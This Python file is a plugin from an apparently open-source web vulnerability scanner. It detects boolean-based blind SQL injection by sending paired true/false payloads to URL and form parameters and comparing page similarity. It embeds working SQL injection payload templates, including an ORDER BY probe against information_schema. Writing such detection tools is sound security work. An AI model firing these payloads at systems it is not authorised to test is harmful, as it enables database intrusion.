#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/6/30 4:19 PM
# @Author  : w8ay

import copy
import difflib
import re
import config

import requests
from lib.core.data import KB
from urllib import parse
from lib.core.common import random_str, generateResponse, url_dict2str
from lib.core.enums import PLACE, VulType, HTTPMETHOD
from lib.core.plugins import PluginBase
from lib.helper.diifpage import findDynamicContent, getFilteredPageContent


class Z0SCAN(PluginBase):
    name = '基于布尔判断的SQL注入'

    def __init__(self):
        super().__init__()
        # 初始化序列匹配器，用于比较页面内容的相似度
        self.seqMatcher = difflib.SequenceMatcher(None)
        # 设置页面相似度的上下界
        self.UPPER_RATIO_BOUND = 0.98
        self.LOWER_RATIO_BOUND = 0.02

        # 设置页面相似度的差异容忍度
        self.DIFF_TOLERANCE = 0.05
        # 设置常量相似度阈值
        self.CONSTANT_RATIO = 0.9

        # 设置重试次数
        self.retry = 6  # 重试次数
        # 存储动态内容的标记
        self.dynamic = []

    '''
    伪静态部分函数定义
    '''
    def _inject_payload(self, keyword, value, payload):
        """在指定位置注入payload"""
        # 替换关键字符后的值为payload
        return re.sub(r'/{}/{}'.format(re.escape(keyword), re.escape(value)),r'/{}/{}'.format(keyword, parse.quote(payload)), self.requests.url)
    
    def _extract_pseudo_static_params(self):
        """从URL中提取伪静态参数"""
        params = {}
        for keyword in config.PSEUDO_STATIC_KEYWORDS:
            pattern = re.compile(r'/{}/?(\d+|[^/]+)'.format(re.escape(keyword)), re.I)
            match = pattern.search(self.requests.url)
            if match:
                # params[id] = 1
                params[keyword] = match.group(1)
        return params
    
    def inject2(self, keyword, value, payload_false, payload_true):
        is_inject = False
        injected_url = self._inject_payload(keyword, value, payload_false)
        r2 = self.req(PLACE.URI, injected_url)
        falsePage = self.removeDynamicContent(r2.text)
        try:
            self.seqMatcher.set_seq1(self.resp_str)
            self.seqMatcher.set_seq2(falsePage)
            ratio_false = round(self.seqMatcher.quick_ratio(), 3)
            if ratio_false == 1.0:
                return False
        except (MemoryError, OverflowError):
            return False
        injected_url = self._inject_payload(keyword, value, payload_true)
        r = self.req(PLACE.URI, injected_url)
        truePage = self.removeDynamicContent(r.text)
        if truePage == falsePage:
            return False
        try:
            self.seqMatcher.set_seq1(self.resp_str or "")
            self.seqMatcher.set_seq2(truePage or "")
            ratio_true = round(self.seqMatcher.quick_ratio(), 3)
        except (MemoryError, OverflowError):
            return False
        # 判断是否存在SQL注入漏洞
        if ratio_true > self.UPPER_RATIO_BOUND and abs(ratio_true - ratio_false) > self.DIFF_TOLERANCE:
            if ratio_false <= self.UPPER_RATIO_BOUND:
                is_inject = True
        if not is_inject and ratio_true > 0.68 and ratio_true > ratio_false:
            # 进一步分析页面内容
            originalSet = set(getFilteredPageContent(self.resp_str, True, "\n").split("\n"))
            trueSet = set(getFilteredPageContent(truePage, True, "\n").split("\n"))
            falseSet = set(getFilteredPageContent(falsePage, True, "\n").split("\n"))
            if len(originalSet - trueSet) <= 2 and trueSet != falseSet:
                candidates = trueSet - falseSet
                if len(candidates) > 0:
                    is_inject = True
        # 如果存在注入漏洞，返回详细信息
        if is_inject:
            ret = []
            ret.append({
                "request": r.reqinfo,
                "response": generateResponse(r),
                "key": keyword,
                "payload": payload_true,
                "position": "URL",
                "desc": "发送True请求包与原网页相似度:{}".format(ratio_true)
            })
            ret.append({
                "request": r2.reqinfo,
                "response": generateResponse(r2),
                "key": keyword,
                "payload": payload_false,
                "position": "URL",
                "desc": "发送False请求包与原网页相似度:{}".format(ratio_false)
            })
            return ret
        else:
            return False
        
    def findDynamicContent(self, firstPage, secondPage):
        # 查找页面中的动态内容
        ret = findDynamicContent(firstPage, secondPage)
        if ret:
            self.dynamic.extend(ret)

    def removeDynamicContent(self, page):
        """
        根据预计算的动态内容标记，移除页面中的动态内容
        """
        if page:
            for item in self.dynamic:
                prefix, suffix = item
                if prefix is None and suffix is None:
                    continue
                elif prefix is None:
                    # 如果前缀为空，移除后缀之前的所有内容
                    page = re.sub(r"(?s)^.+%s" % re.escape(suffix), suffix.replace('\\', r'\\'), page)
                elif suffix is None:
                    # 如果后缀为空，移除前缀之后的所有内容
                    page = re.sub(r"(?s)%s.+$" % re.escape(prefix), prefix.replace('\\', r'\\'), page)
                else:
                    # 如果前后缀都存在，移除前后缀之间的内容
                    page = re.sub(r"(?s)%s.+%s" % (re.escape(prefix), re.escape(suffix)),
                                  "%s%s" % (prefix.replace('\\', r'\\'), suffix.replace('\\', r'\\')), page)
        return page

    def inject(self, params, positon, k, payload_false, payload_true):
        # 复制原始参数
        data = copy.deepcopy(params)
        is_inject = False

        # 注入False payload
        data[k] = payload_false
        r2 = self.req(positon, url_dict2str(data, positon))
        falsePage = self.removeDynamicContent(r2.text)

        try:
            # 计算False页面与原页面的相似度
            self.seqMatcher.set_seq1(self.resp_str)
            self.seqMatcher.set_seq2(falsePage)
            ratio_false = round(self.seqMatcher.quick_ratio(), 3)
            if ratio_false == 1.0:
                return False
        except (MemoryError, OverflowError):
            return False

        # 注入True payload
        data[k] = payload_true
        r = self.req(positon, url_dict2str(data, positon))
        truePage = self.removeDynamicContent(r.text)

        # 如果True页面和False页面相同，返回False
        if truePage == falsePage:
            return False

        try:
            # 计算True页面与原页面的相似度
            self.seqMatcher.set_seq1(self.resp_str or "")
            self.seqMatcher.set_seq2(truePage or "")
            ratio_true = round(self.seqMatcher.quick_ratio(), 3)
        except (MemoryError, OverflowError):
            return False

        # 判断是否存在SQL注入漏洞
        if ratio_true > self.UPPER_RATIO_BOUND and abs(ratio_true - ratio_false) > self.DIFF_TOLERANCE:
            if ratio_false <= self.UPPER_RATIO_BOUND:
                is_inject = True
        if not is_inject and ratio_true > 0.68 and ratio_true > ratio_false:
            # 进一步分析页面内容
            originalSet = set(getFilteredPageContent(self.resp_str, True, "\n").split("\n"))
            trueSet = set(getFilteredPageContent(truePage, True, "\n").split("\n"))
            falseSet = set(getFilteredPageContent(falsePage, True, "\n").split("\n"))

            if len(originalSet - trueSet) <= 2 and trueSet != falseSet:
                candidates = trueSet - falseSet
                if len(candidates) > 0:
                    is_inject = True

        # 如果存在注入漏洞，返回详细信息
        if is_inject:
            ret = []
            ret.append({
                "request": r.reqinfo,
                "response": generateResponse(r),
                "key": k,
                "payload": payload_true,
                "position": positon,
                "desc": "发送True请求包与原网页相似度:{}".format(ratio_true)
            })
            ret.append({
                "request": r2.reqinfo,
                "response": generateResponse(r2),
                "key": k,
                "payload": payload_false,
                "position": positon,
                "desc": "发送False请求包与原网页相似度:{}".format(ratio_false)
            })
            return ret
        else:
            return False

    def generatePayloads(self, payloadTemplate, v, is_num=False):
        '''
        根据payload模板生成布尔盲注所需要的True 和 False payload
        :param payloadTemplate:
        :return:
        '''
        if is_num:
            # 如果是数字类型，生成False payload
            payload_false = "{}-100000".format(v)
        else:
            # 生成两个不同的随机字符串
            str1 = random_str(2)
            str2 = random_str(2)
            while str1 == str2:
                str2 = random_str(2)
            # 生成False payload
            payload_false = v + payloadTemplate.format(str1, str2)

        # 生成True payload
        rand_str = random_str(2)
        if is_num:
            payload_true = "{}-0".format(v)
        else:
            payload_true = v + payloadTemplate.format(rand_str, rand_str)
        return payload_true, payload_false

    def audit(self):
        if KB["WafState"]:
            return
        count = 0
        ratio = 0
        inject = False
        # 动态内容替换
        self.resp_str = self.response.text
        while ratio <= 0.98:
            if count > self.retry:
                return
            # 根据请求方法发送请求
            if self.requests.method == HTTPMETHOD.POST:
                r = requests.post(self.requests.url, data=self.requests.data, headers=self.requests.headers)
            else:
                r = requests.get(self.requests.url, headers=self.requests.headers)
            # 移除动态内容
            html = self.removeDynamicContent(r.text)
            self.resp_str = self.removeDynamicContent(self.resp_str)
            try:
                # 计算页面相似度
                self.seqMatcher.set_seq1(self.resp_str)
                self.seqMatcher.set_seq2(html)
                ratio = round(self.seqMatcher.quick_ratio(), 3)
            except MemoryError:
                return
            # 查找动态内容
            self.findDynamicContent(self.resp_str, html)
            count += 1
    
        # 生成测试数据
        iterdatas = self.generateItemdatas()
        # SQL注入payload模板
        sql_payload = [
            "'and'{0}'='{1}",
            '"and"{0}"="{1}',
            " and '{0}'='{1}-- ",
            "' and '{0}'='{1}-- ",
            '''" and '{0}'='{1}-- ''',
            ") and '{0}'='{1}-- ",
            "') and '{0}'='{1}-- ",
            '''") and '{0}'='{1}-- '''
        ]
        for origin_dict, positon in iterdatas:
            if any(re.search(r'/{}/?(\d+|[^/]+)'.format(re.escape(keyword)), self.requests.url, re.I) for keyword in config.PSEUDO_STATIC_KEYWORDS):
                params = self._extract_pseudo_static_params()
                for keyword, value in params.items():
                    if str(value).isdigit():
                        is_num = True
                    else:
                        continue
                    payload_true, payload_false = self.generatePayloads(sql_payload, value, is_num)
                    ret1 = self.inject2(keyword, value, payload_false, payload_true)
                    if ret1:
                        payload_true, payload_false = self.generatePayloads(sql_payload, value, is_num)
                        ret2 = self.inject2(keyword, value, payload_false, payload_true)
                        if ret2:
                            result = self.new_result()
                            result.init_info(self.requests.url, "SQL注入", VulType.SQLI)
                            for values in ret1:
                                result.add_detail("第一次布尔验证", values["request"], values["response"],
                                                values["desc"], values["key"], values["payload"],
                                                values["position"])
                            for values in ret2:
                                result.add_detail("第二次布尔验证", values["request"], values["response"],
                                                values["desc"], values["key"], values["payload"],
                                                values["position"])
                            self.success(result)
                            inject = True
            for k, v in origin_dict.items():
                temp_sql_flag = sql_payload.copy()
                # 测试order by
                if "desc" in v or "asc" in v:
                    _sql_flag = ",if('{0}'='{1}',1,(select 1 from information_schema.tables))"
                    temp_sql_flag.append(_sql_flag)

                for payload in temp_sql_flag:
                    is_num = False
                    if str(v).isdigit():
                        is_num = True
                    else:
                        continue
                    # 生成True和False payload
                    payload_true, payload_false = self.generatePayloads(payload, v, is_num)
                    ret1 = self.inject(origin_dict, positon, k, payload_false, payload_true)
                    if ret1:
                        payload_true, payload_false = self.generatePayloads(payload, v, is_num)
                        ret2 = self.inject(origin_dict, positon, k, payload_false, payload_true)
                        if ret2:
                            # 生成漏洞报告
                            result = self.new_result()
                            result.init_info(self.requests.url, "SQL注入", VulType.SQLI)
                            for values in ret1:
                                result.add_detail("第一次布尔验证", values["request"], values["response"],
                                                values["desc"], values["key"], values["payload"],
                                                values["position"])
                            for values in ret2:
                                result.add_detail("第二次布尔验证", values["request"], values["response"],
                                                values["desc"], values["key"], values["payload"],
                                                values["position"])
                            self.success(result)
                            inject = True
            if inject:
                return True